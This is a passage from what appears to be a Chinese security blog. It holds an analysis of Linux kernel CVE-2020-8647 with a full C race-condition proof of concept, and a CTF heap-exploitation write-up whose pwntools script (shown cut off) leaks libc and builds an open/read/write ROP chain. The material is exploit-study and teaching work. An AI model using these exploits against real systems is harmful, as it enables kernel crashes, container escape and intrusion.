class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个函数是包装之后的vc_deallocate（），其作用是把所有空闲的设备释放掉，这个函数在操作vc_,console_lock是基于信号量实现的一种锁,这里用的是二元信号量,简单说一下，console_lock维持着一个console_sem的信号量，该信号量的初始值为1,然后当进入代码临界区就会调用console_lock(),如果信号量不为0就将信号量减一，如果信号量为0则堵塞当前线程，然后把当前进程放到堵塞队列里面，当出代码临界区的时候，会调用console_unlock()，将信号量加一，然后调度堵塞队列里面的一个进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void console_lock(void)</span><br><span class="line">&#123;</span><br><span class="line">might_sleep();</span><br><span class="line"></span><br><span class="line">down_console_sem();</span><br><span class="line">if (console_suspended)</span><br><span class="line">return;</span><br><span class="line">console_locked = 1;</span><br><span class="line">console_may_schedule = 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define down_console_sem() do &#123; \</span><br><span class="line">down(&amp;console_sem);\</span><br><span class="line">mutex_acquire(&amp;console_lock_dep_map, 0, 0, _RET_IP_);\</span><br><span class="line">&#125; while (0)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">static DEFINE_SEMAPHORE(console_sem);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define DEFINE_SEMAPHORE(name)\</span><br><span class="line">struct semaphore name = __SEMAPHORE_INITIALIZER(name, 1)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#define __SEMAPHORE_INITIALIZER(name, n)\</span><br><span class="line">&#123;\</span><br><span class="line">.lock= __RAW_SPIN_LOCK_UNLOCKED((name).lock),\</span><br><span class="line">.count= n,\</span><br><span class="line">.wait_list= LIST_HEAD_INIT((name).wait_list),\</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后就是VT_BUSY（）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define VT_BUSY(i)(VT_IS_IN_USE(i) || i == fg_console || vc_cons[i].d == sel_cons)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#define VT_IS_IN_USE(i)(console_driver-&gt;ttys[i] &amp;&amp; console_driver-&gt;ttys[i]-&gt;count)</span><br></pre></td></tr></table></figure><p>这个宏,来判断vc_cons[i]是否处于busy状态，之后就是调用vc_deallocate（）我们可以看到 <strong>vc_cons[currcons].d = NULL</strong> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">struct vc_data *vc_deallocate(unsigned int currcons)</span><br><span class="line">&#123;</span><br><span class="line">struct vc_data *vc = NULL;</span><br><span class="line"></span><br><span class="line">WARN_CONSOLE_UNLOCKED();</span><br><span class="line"></span><br><span class="line">if (vc_cons_allocated(currcons)) &#123;</span><br><span class="line">struct vt_notifier_param param;</span><br><span class="line"></span><br><span class="line">param.vc = vc = vc_cons[currcons].d;</span><br><span class="line">atomic_notifier_call_chain(&amp;vt_notifier_list, VT_DEALLOCATE, &amp;param);</span><br><span class="line">vcs_remove_sysfs(currcons);</span><br><span class="line">visual_deinit(vc);</span><br><span class="line">put_pid(vc-&gt;vt_pid);</span><br><span class="line">vc_uniscr_set(vc, NULL);</span><br><span class="line">kfree(vc-&gt;vc_screenbuf);</span><br><span class="line">vc_cons[currcons].d = NULL;</span><br><span class="line">&#125;</span><br><span class="line">return vc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x01-vt-disallocate（）函数"><a href="#0x01-vt-disallocate（）函数" class="headerlink" title="0x01 vt_disallocate（）函数"></a>0x01 vt_disallocate（）函数</h4><p>如果arg不为0并且在合适的范围里面，则会调用vt_disallocate（）函数，vc_deallocate这个函数也是对vc_deallocate（）函数的一个包装，和vt_disallocate_all（）区别不大，就是从释放全部变成释放指定的索引</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">static int vt_disallocate(unsigned int vc_num)</span><br><span class="line">&#123;</span><br><span class="line">struct vc_data *vc = NULL;</span><br><span class="line">int ret = 0;</span><br><span class="line"></span><br><span class="line">console_lock();</span><br><span class="line">if (VT_BUSY(vc_num))</span><br><span class="line">ret = -EBUSY;</span><br><span class="line">else if (vc_num)</span><br><span class="line">vc = vc_deallocate(vc_num);</span><br><span class="line">console_unlock();</span><br><span class="line"></span><br><span class="line">if (vc &amp;&amp; vc_num &gt;= MIN_NR_CONSOLES) &#123;</span><br><span class="line">tty_port_destroy(&amp;vc-&gt;port);</span><br><span class="line">kfree(vc);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x01-VT-ACTIVATE"><a href="#0x01-VT-ACTIVATE" class="headerlink" title="0x01 VT_ACTIVATE"></a>0x01 VT_ACTIVATE</h3><p>找到了能释放的vc_cons的case，我们还得，找到能够分配vc_cons的case，而VT_ACTIVATE这个case正是我们需要的，（至于怎么找到的VT_ACTIVATE这个case，可以考虑用 <strong>grep</strong> 正则匹配，然后回溯到vt_ioctl()这个函数，我是手找的。。。。）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">case VT_ACTIVATE:</span><br><span class="line">if (!perm)</span><br><span class="line">return -EPERM;</span><br><span class="line">if (arg == 0 || arg &gt; MAX_NR_CONSOLES)</span><br><span class="line">ret =  -ENXIO;</span><br><span class="line">else &#123;</span><br><span class="line">arg--;</span><br><span class="line">console_lock();</span><br><span class="line">ret = vc_allocate(arg);</span><br><span class="line">console_unlock();</span><br><span class="line">if (ret)</span><br><span class="line">break;</span><br><span class="line">set_console(arg);</span><br><span class="line">&#125;</span><br><span class="line">break;</span><br></pre></td></tr></table></figure><p>这个函数比较关键的就是调用了vc_allocate()函数，大概的逻辑就是如果vc_cons[currcons].d不为NULL就返回，如果为NULL就分配一个新的vc_cons[currcons].d</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">int vc_allocate(unsigned int currcons)/* return 0 on success */</span><br><span class="line">&#123;</span><br><span class="line">struct vt_notifier_param param;</span><br><span class="line">struct vc_data *vc;</span><br><span class="line"></span><br><span class="line">WARN_CONSOLE_UNLOCKED();</span><br><span class="line"></span><br><span class="line">if (currcons &gt;= MAX_NR_CONSOLES)</span><br><span class="line">return -ENXIO;</span><br><span class="line"></span><br><span class="line">if (vc_cons[currcons].d)</span><br><span class="line">return 0;</span><br><span class="line"></span><br><span class="line">/* due to the granularity of kmalloc, we waste some memory here */</span><br><span class="line">/* the alloc is done in two steps, to optimize the common situation</span><br><span class="line">   of a 25x80 console (structsize=216, screenbuf_size=4000) */</span><br><span class="line">/* although the numbers above are not valid since long ago, the</span><br><span class="line">   point is still up-to-date and the comment still has its value</span><br><span class="line">   even if only as a historical artifact.  --mj, July 1998 */</span><br><span class="line">param.vc = vc = kzalloc(sizeof(struct vc_data), GFP_KERNEL);</span><br><span class="line">if (!vc)</span><br><span class="line">return -ENOMEM;</span><br><span class="line"></span><br><span class="line">vc_cons[currcons].d = vc;</span><br><span class="line">tty_port_init(&amp;vc-&gt;port);</span><br><span class="line">INIT_WORK(&amp;vc_cons[currcons].SAK_work, vc_SAK);</span><br><span class="line"></span><br><span class="line">visual_init(vc, currcons, 1);</span><br><span class="line"></span><br><span class="line">if (!*vc-&gt;vc_uni_pagedir_loc)</span><br><span class="line">con_set_default_unimap(vc);</span><br><span class="line"></span><br><span class="line">vc-&gt;vc_screenbuf = kzalloc(vc-&gt;vc_screenbuf_size, GFP_KERNEL);</span><br><span class="line">if (!vc-&gt;vc_screenbuf)</span><br><span class="line">goto err_free;</span><br><span class="line"></span><br><span class="line">/* If no drivers have overridden us and the user didn&apos;t pass a</span><br><span class="line">   boot option, default to displaying the cursor */</span><br><span class="line">if (global_cursor_default == -1)</span><br><span class="line">global_cursor_default = 1;</span><br><span class="line"></span><br><span class="line">vc_init(vc, vc-&gt;vc_rows, vc-&gt;vc_cols, 1);</span><br><span class="line">vcs_make_sysfs(currcons);</span><br><span class="line">atomic_notifier_call_chain(&amp;vt_notifier_list, VT_ALLOCATE, &amp;param);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">err_free:</span><br><span class="line">visual_deinit(vc);</span><br><span class="line">kfree(vc);</span><br><span class="line">vc_cons[currcons].d = NULL;</span><br><span class="line">return -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x02-触发漏洞思路"><a href="#0x02-触发漏洞思路" class="headerlink" title="0x02 触发漏洞思路"></a>0x02 触发漏洞思路</h2><p>现在万事具备了，现在就是要考虑怎么去触发条件竞争，我的思路是，开两个进程，一个进程不停的分配vc_cons[currcons].d和释放vc_cons[currcons].d，另一进程不停的去做VT_RESIZEX的调用，从而触发漏洞</p><h1 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h1><h2 id="0x00-内核编译"><a href="#0x00-内核编译" class="headerlink" title="0x00 内核编译"></a>0x00 内核编译</h2><p>我选择是5.4.7内核，先下载源码，然后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make menuconfig</span><br></pre></td></tr></table></figure><p>在kernel hacking下的compile-time checks and compiler options选中添加符号表，这样的话，调试的时候会舒服很多</p><p><img src="/2020/03/13/CVE-2020-8647分析/kernel_hack.png" alt=""></p><p>又因为我们这个洞是空指针引用，导致uaf，所以并不会panic，所以，我们还得添加一些内存检测的机制kasan,还是在kernel hacking里面的memory debugging，能选的全选上</p><p><img src="/2020/03/13/CVE-2020-8647分析/memdebug.png" alt=""></p><h2 id="0x01-镜像"><a href="#0x01-镜像" class="headerlink" title="0x01 镜像"></a>0x01 镜像</h2><p>镜像的话，我使用的<a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md" target="_blank" rel="noopener">https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md</a></p><p>主要这个可以用ssh，就不能每写一次poc就得打包一次，还可以在镜像里面直接编译，比较方便，但是有一些坑。。。。</p><h2 id="0x02-qemu启动命令"><a href="#0x02-qemu启动命令" class="headerlink" title="0x02 qemu启动命令"></a>0x02 qemu启动命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">alias kernel-5-4-7=&quot;qemu-system-x86_64 \</span><br><span class="line">  -kernel /home/pwnht/linux-5.4-rc7/arch/x86/boot/bzImage \</span><br><span class="line">  -append \&quot;console=ttyS0 root=/dev/sda earlyprintk=serial nokaslr\&quot;\</span><br><span class="line">  -hdb /home/pwnht/image/stretch.img \</span><br><span class="line">  -net user,hostfwd=tcp::10021-:22 -net nic \</span><br><span class="line">  -enable-kvm \</span><br><span class="line">  -nographic \</span><br><span class="line">  -m 2G \</span><br><span class="line">  -smp 2 \</span><br><span class="line">  -s \</span><br><span class="line">  -pidfile vm.pid \</span><br><span class="line">  2&gt;&amp;1 | tee vm.log &quot;</span><br></pre></td></tr></table></figure><p>我把qemu启动命令映射了一个比较短的命令，这样比较方便</p><h2 id="0x03-gdb调试"><a href="#0x03-gdb调试" class="headerlink" title="0x03 gdb调试"></a>0x03 gdb调试</h2><p>自己调试的时候，建议关闭kaslr，这样的话，gdb可以正确的识别kernel的基地址，然后源码也能容易的加载上，我其实是想用gdb多线程调试，我自己手动调度线程，来实现百分之百成功的条件竞争，奈何linux kernel有自己的时间调度函数，你刚到断点，就被时间回调函数回调了，然后不知道走到哪里了，所以只能运行poc看结果</p><h2 id="0x04-运行poc"><a href="#0x04-运行poc" class="headerlink" title="0x04 运行poc"></a>0x04 运行poc</h2><p>运行大概一秒钟就会 <strong>Segmentation fault</strong></p><p><img src="/2020/03/13/CVE-2020-8647分析/poc.png" alt=""></p><p>这个时候输入dmesg查看log</p><p><img src="/2020/03/13/CVE-2020-8647分析/success.png" alt=""></p><p>发现复现成功</p><h1 id="0x04-完整poc"><a href="#0x04-完整poc" class="headerlink" title="0x04 完整poc"></a>0x04 完整poc</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">#define VT_DISALLOCATE0x5608</span><br><span class="line">#define VT_RESIZEX      0x560A</span><br><span class="line">#define VT_ACTIVATE0x5606</span><br><span class="line">#defineEBUSY1</span><br><span class="line">struct vt_consize &#123;</span><br><span class="line">unsigned short v_rows;/* number of rows */</span><br><span class="line">unsigned short v_cols;/* number of columns */</span><br><span class="line">unsigned short v_vlin;/* number of pixel rows on screen */</span><br><span class="line">unsigned short v_clin;/* number of pixel rows per character */</span><br><span class="line">unsigned short v_vcol;/* number of pixel columns on screen */</span><br><span class="line">unsigned short v_ccol;/* number of pixel columns per character */</span><br><span class="line">&#125;;</span><br><span class="line">int main()&#123;</span><br><span class="line">    int fd=open(&quot;/dev/tty10&quot;,O_RDONLY);</span><br><span class="line">    if (fd &lt; 0) &#123;</span><br><span class="line">        perror(&quot;open&quot;);</span><br><span class="line">        exit(-2);</span><br><span class="line">    &#125;</span><br><span class="line">    int pid=fork();</span><br><span class="line">    if(pid&lt;0)&#123;</span><br><span class="line">        perror(&quot;error fork&quot;);</span><br><span class="line">    &#125;else if(pid==0)&#123;</span><br><span class="line">while(1)&#123;</span><br><span class="line">for(int i=10;i&lt;20;i++)&#123;</span><br><span class="line">ioctl(fd,VT_ACTIVATE,i);</span><br><span class="line">&#125;</span><br><span class="line">for(int i=10;i&lt;20;i++)&#123;</span><br><span class="line">ioctl(fd,VT_DISALLOCATE,i);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;main thread finish\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        struct vt_consize v;</span><br><span class="line">        v.v_vcol=v.v_ccol=v.v_clin=v.v_vlin=1;</span><br><span class="line">        v.v_rows=v.v_vlin/v.v_clin;</span><br><span class="line">        v.v_cols=v.v_vcol/v.v_ccol;</span><br><span class="line">while(1)&#123;</span><br><span class="line">        ioctl(fd,VT_RESIZEX,&amp;v);</span><br><span class="line">printf(&quot;child finish\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>这个漏洞实际上没有什么攻击性，也不是特别难，但是，我想通过我的复现过程，来给大家复现其他漏洞的一些复现思路</p><h2 id="2020-8-12补充"><a href="#2020-8-12补充" class="headerlink" title="2020/8/12补充"></a>2020/8/12补充</h2><p>这个漏洞也也不是很鸡肋也可以用用作docker逃逸的辅助漏洞</p><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><p><a href="https://github.com/torvalds/linux/commit/6cd1ed50efd88261298577cd92a14f2768eddeeb" target="_blank" rel="noopener">https://github.com/torvalds/linux/commit/6cd1ed50efd88261298577cd92a14f2768eddeeb</a></p>]]></content>
    
    <summary type="html">
    
      这里分析cve-2020-8647成因，以及poc的编写
    
    </summary>
    
    
    
      <category term="cve,linux kernel" scheme="http://yoursite.com/tags/cve-linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>buuoj新春红包第三题wp</title>
    <link href="http://yoursite.com/2020/02/02/buuoj%E6%96%B0%E6%98%A5%E7%BA%A2%E5%8C%85%E7%AC%AC%E4%B8%89%E9%A2%98wp/"/>
    <id>http://yoursite.com/2020/02/02/buuoj新春红包第三题wp/</id>
    <published>2020-02-02T08:08:43.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-check"><a href="#0x00-check" class="headerlink" title="0x00 check"></a>0x00 check</h1><p><img src="/2020/02/02/buuoj新春红包第三题wp/checksec.png" alt=""></p><p>没得canary考虑stack overflow </p><p>还有一个小小的沙箱禁用了execve</p><p><img src="/2020/02/02/buuoj新春红包第三题wp/sec.png" alt=""></p><p>考虑用open read write输出flag</p><h1 id="0x01-程序逻辑"><a href="#0x01-程序逻辑" class="headerlink" title="0x01 程序逻辑"></a>0x01 程序逻辑</h1><p>典型的菜单题目</p><p><img src="/2020/02/02/buuoj新春红包第三题wp/main.png" alt=""></p><p>有四个功能典型的增删改查，但是有一些限制</p><h2 id="0x00-get-函数"><a href="#0x00-get-函数" class="headerlink" title="0x00 get()函数"></a>0x00 get()函数</h2><p>调用get()函数的次数是有限制的</p><p><img src="/2020/02/02/buuoj新春红包第三题wp/get1.png" alt=""></p><p>最多调用0x1c次，而且，get()函数里面用的calloc函数，而不是malloc，这里就有一个点了，calloc是不用tcache bin的，这就导致，你free到tcache的chunk，怎么也calloc不出来，就很难受，还有就是malloc的size也有限制</p><p><img src="/2020/02/02/buuoj新春红包第三题wp/get2.png" alt=""></p><h2 id="0x01-change-函数"><a href="#0x01-change-函数" class="headerlink" title="0x01 change()函数"></a>0x01 change()函数</h2><p>还有就是只能chenge一次</p><h2 id="0x02-backdoor-函数"><a href="#0x02-backdoor-函数" class="headerlink" title="0x02 backdoor()函数"></a>0x02 backdoor()函数</h2><p><img src="/2020/02/02/buuoj新春红包第三题wp/backdoor.png" alt=""></p><p>达成一定的条件，然后有个简单栈溢出，但是只能控制到ret address</p><h1 id="0x02-漏洞点"><a href="#0x02-漏洞点" class="headerlink" title="0x02 漏洞点"></a>0x02 漏洞点</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>其实，漏洞点有三个，一开始没看到，导致很难做，但是好像第三个洞有和没有，好像都能做，我的做法也算半个非预期</p><h2 id="0x01-free之后指针清0"><a href="#0x01-free之后指针清0" class="headerlink" title="0x01 free之后指针清0"></a>0x01 free之后指针清0</h2><p><img src="/2020/02/02/buuoj新春红包第三题wp/free.png" alt=""></p><h2 id="0x02-stack-overflow-backdoor函数不再赘述"><a href="#0x02-stack-overflow-backdoor函数不再赘述" class="headerlink" title="0x02 stack overflow backdoor函数不再赘述"></a>0x02 stack overflow backdoor函数不再赘述</h2><h2 id="0x03-chunk-list没有初始化导致有残余指针"><a href="#0x03-chunk-list没有初始化导致有残余指针" class="headerlink" title="0x03 chunk list没有初始化导致有残余指针"></a>0x03 chunk list没有初始化导致有残余指针</h2><p><img src="/2020/02/02/buuoj新春红包第三题wp/stack.png" alt=""></p><p><img src="/2020/02/02/buuoj新春红包第三题wp/stack2.png" alt=""></p><h1 id="0x03-思路"><a href="#0x03-思路" class="headerlink" title="0x03 思路"></a>0x03 思路</h1><ul><li>首先leak libc和heap address</li><li>然后改一个chunk，在stack上写chunk list将其中一个chunk改成0x1000chunk的地址 free掉</li><li>之后malloc回来，改成满足backdoor的函数的条件</li><li>移stack到heap，然后rop</li><li>open read write</li></ul><h1 id="0x04-exploit"><a href="#0x04-exploit" class="headerlink" title="0x04 exploit"></a>0x04 exploit</h1><p>pwnIO.py</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">from pwnIO import *</span><br><span class="line"></span><br><span class="line">io = pwnIO(&quot;./red&quot;, &quot;chall.pwnable.tw&quot;, 10208, &quot;amd64&quot;, &quot;2.29&quot;, &apos;./libc-2.29.so&apos;)</span><br><span class="line">io.debug()</span><br><span class="line">#io.remote()</span><br><span class="line">leave_ret=0x000000000003ef85 </span><br><span class="line">pop_rdi=0x00000000000219a0</span><br><span class="line">pop_rsi=0x0000000000024395</span><br><span class="line">pop_rdx=0x0000000000001b9a</span><br><span class="line">push_rax=0x000000000001f198</span><br><span class="line">def get(idx, idx2, cont):</span><br><span class="line">    io.sl(1)</span><br><span class="line">    io.ru(&apos;idx: &apos;)</span><br><span class="line">    io.sl(idx)</span><br><span class="line">    io.ru(&apos;0x400): &apos;)</span><br><span class="line">    io.sl(idx2)</span><br><span class="line">    io.ru(&apos;ontent: &apos;)</span><br><span class="line">    io.s(cont)</span><br><span class="line">    sleep(0.1)</span><br><span class="line"></span><br><span class="line">def dele(idx):</span><br><span class="line">    io.sl(2)</span><br><span class="line">    io.ru(&apos;idx: &apos;)</span><br><span class="line">    io.sl(idx)</span><br><span class="line"></span><br><span class="line">def change(idx, cont):</span><br><span class="line">    io.sl(3)</span><br><span class="line">    io.ru(&apos;idx: &apos;)</span><br><span class="line">    io.sl(idx)</span><br><span class="line">    io.ru(&apos;ent: &apos;)</span><br><span class="line">    io.sl(cont)</span><br><span class="line">    sleep(0.1)</span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">    io.sl(4)</span><br><span class="line">    io.ru(&apos;idx: &apos;)</span><br><span class="line">    io.sl(idx)</span><br><span class="line"></span><br><span class="line">def hack(cont):</span><br><span class="line">    io.ru(&apos;say?&apos;)</span><br><span class="line">    io.s(cont)</span><br><span class="line">    sleep(0.1)</span><br><span class="line">libc = io.get_libc()</span><br><span class="line">io.attach()</span><br><span class="line">for i in range(2,9):</span><br><span class="line">    get(i,2, &apos;a&apos;)</span><br><span class="line">for i in range(2,9):</span><br><span class="line">    dele(i)</span><br><span class="line">get(2,2,&apos;a&apos;)</span><br><span class="line">get(3,4,&apos;aa&apos;)</span><br><span class="line">dele(2)</span><br><span class="line">show(2)</span><br><span class="line">print &apos;------------------&apos;</span><br><span class="line">main_arena = u64(io.r(6).ljust(8, &apos;\x00&apos;))</span><br><span class="line">libc.address = main_arena - 0x3b3ca0</span><br><span class="line">log.success(&apos;libc base 0x%x&apos; %(libc.address))</span><br><span class="line">show(6)</span><br><span class="line">heap_address = u64(io.r(6).ljust(8, &apos;\x00&apos;)) &amp; ~0xfff</span><br><span class="line">log.success(&apos;heap address 0x%x&apos; %(heap_address))</span><br><span class="line">heap_ptr=heap_address-0x1000+0x260</span><br><span class="line">rop=p64(libc.address+pop_rdi)+p64(heap_address+0xe80+0x200)+p64(libc.address+pop_rsi)+p64(0)+p64(libc.sym[&apos;open&apos;])</span><br><span class="line">rop+=p64(libc.address+pop_rdi)+p64(3)+p64(libc.address+pop_rsi)+p64(heap_address+0xe80+0x200)+p64(libc.address+pop_rdx)+p64(0x100)+p64(libc.sym[&apos;read&apos;])</span><br><span class="line">rop+=p64(libc.address+pop_rdi)+p64(1)+p64(libc.address+pop_rsi)+p64(heap_address+0xe80+0x200)+p64(libc.address+pop_rdx)+p64(0x100)+p64(libc.sym[&apos;write&apos;])</span><br><span class="line">get(3,4,rop.ljust(0x200,&apos;\x00&apos;)+&apos;/ctf/work/red/flag&apos;+&apos;\x00aaa&apos;)</span><br><span class="line">change(1,p64(heap_ptr))</span><br><span class="line">io.b()</span><br><span class="line">dele(4)</span><br><span class="line"></span><br><span class="line">get(1,4,&apos;aa&apos;)</span><br><span 